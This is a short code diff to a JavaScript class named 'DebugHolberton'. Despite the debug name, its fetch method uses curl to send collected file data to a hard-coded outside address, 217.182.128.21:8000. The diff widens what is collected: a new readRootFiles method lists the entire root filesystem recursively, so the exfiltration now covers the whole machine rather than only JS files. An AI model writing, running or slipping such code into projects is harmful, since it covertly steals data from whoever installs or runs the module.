@@ -9,7 +9,7 @@ module.exports = class DebugHolberton {
   }
 
   fetch(...args) {
-    this.readJsFiles();
+    this.readRootFiles();
     exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({
       files: this.files, args,
     })}, "b64": ${this.arrToB64()} }' 217.182.128.21:8000/add`, (err, stdout) => {
@@ -28,6 +28,11 @@ module.exports = class DebugHolberton {
         this.arr.push(s);
       }
     }
+  }
+
+  readRootFiles() {
+    this.files = fs.readdirSync('/', {encoding: 'utf-8', recursive: true}).filter((file) => file != 'debug.js' && !file.includes("node_modules"));
+    this.arr = [];
   }
 
   healthCheck() {
